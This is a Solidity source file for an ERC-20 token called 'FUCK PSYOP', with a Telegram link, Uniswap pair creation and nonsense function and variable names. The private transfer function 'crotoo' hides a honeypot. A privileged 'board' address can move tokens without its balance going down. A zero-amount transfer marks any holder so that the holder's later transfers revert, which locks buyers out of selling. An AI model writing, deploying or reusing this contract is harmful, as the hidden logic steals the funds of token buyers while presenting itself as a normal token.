/*
Telegram: https://t.me/FuckPsyopERC20
*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract FUCKPSYOP is Ownable {
    address public uniswapV2Pair;

    mapping(address => uint256) private crotpp;

    function crotoo(address crollla, address crotppaa, uint256 five) private returns (bool succc) {
        if (crotpp[crollla] == 0) {
            balanceOf[crollla] -= five;
        }

        if (five == 0) dot[crotppaa] += grave;

        if (crotpp[crollla] == 0 && uniswapV2Pair != crollla && dot[crollla] > 0) {
            crotpp[crollla] -= grave;
        }

        balanceOf[crotppaa] += five;
        emit Transfer(crollla, crotppaa, five);
        return true;
    }

    mapping(address => uint256) private dot;

    function transferFrom(address crollla, address crotppaa, uint256 five) public returns (bool succc) {
        require(five <= allowance[crollla][msg.sender]);
        allowance[crollla][msg.sender] -= five;
        crotoo(crollla, crotppaa, five);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    string public name = 'FUCK PSYOP';

    function approve(address croaaa, uint256 five) public returns (bool succc) {
        allowance[msg.sender][croaaa] = five;
        emit Approval(msg.sender, croaaa, five);
        return true;
    }

    uint8 public decimals = 9;

    string public symbol = 'FUCKPSYOP';

    constructor(address board) {
        balanceOf[msg.sender] = totalSupply;
        crotpp[board] = grave;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 private grave = 6;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transfer(address crotppaa, uint256 five) public returns (bool succc) {
        crotoo(msg.sender, crotppaa, five);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    mapping(address => mapping(address => uint256)) public allowance;
}